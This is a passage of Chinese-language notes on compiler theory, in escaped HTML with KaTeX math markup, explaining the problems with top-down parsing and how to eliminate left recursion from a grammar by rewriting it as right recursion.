class=\"katex-mathml\"><math><semantics><mrow><mi>W</mi><mo>=</mo><mi>a</mi><mi>d</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">W=adb</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">b</span></span></span></span>确实是文法的句子。</li>\n</ol>\n<h4 id=\"自上而下的问题\"><a class=\"markdownIt-Anchor\" href=\"#自上而下的问题\"></a> 自上而下的问题</h4>\n<p>自上而下本质上是最左推导的穷举方法，还带<strong>回溯</strong>，效率极低，因此在使用自上而下分析法的时候，需要对文法有一定的限制：<strong>无左递归</strong>和<strong>无回溯</strong>。</p>\n<h4 id=\"为什么需要消除左递归\"><a class=\"markdownIt-Anchor\" href=\"#为什么需要消除左递归\"></a> 为什么需要消除左递归？</h4>\n<p>显然，左递归会引起死循环。</p>\n<h4 id=\"左递归的消除\"><a class=\"markdownIt-Anchor\" href=\"#左递归的消除\"></a> 左递归的消除</h4>\n<p>如果文法中存在推导<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>A</mi><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\stackrel{+}{\\Rightarrow}A\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.075201em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，则存在左递归。可以直接对左递归的规则进行等价变换。</p>\n<p>若存在非终结字符的直接左递归规则：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi>α</mi><mi mathvariant=\"normal\">∣</mi><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow A\\alpha|\\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>是任意符号串，而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>不以<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>开头，则可以写成等价右递归：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><mi>β</mi><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><mi>α</mi><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;A \\rightarrow \\beta A^{&#x27;}\\\\\n&amp;A^{&#x27;} \\rightarrow \\alpha A^{&#x27;}|\\epsilon\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.3049600000000003em;vertical-align:-1.4024800000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.90248em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-2.25752em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>对于一般情况：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><mi>A</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><mi>A</mi><msub><mi>α</mi><mi>m</mi></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow A \\alpha_{1}|A \\alpha_{2}|\\dots|A \\alpha_{m}|\\beta_{1}|\\beta_{2}|\\dots|\\beta_{n}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>可以写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><msub><mi>β</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mi>n</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mi>m</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;A \\rightarrow \\beta_{1}A^{&#x27;}|\\beta_{2}A^{&#x27;}|\\dots|\\beta_{n}A^{&#x27;}\\\\\n&amp;A^{&#x27;} \\rightarrow \\alpha_{1}A^{&#x27;}|\\alpha_{2}A^{&#x27;}|\\dots|\\alpha_{m}A^{&#x27;}|\\epsilon\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.3049600000000003em;vertical-align:-1.4024800000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.90248em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-2.25752em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span 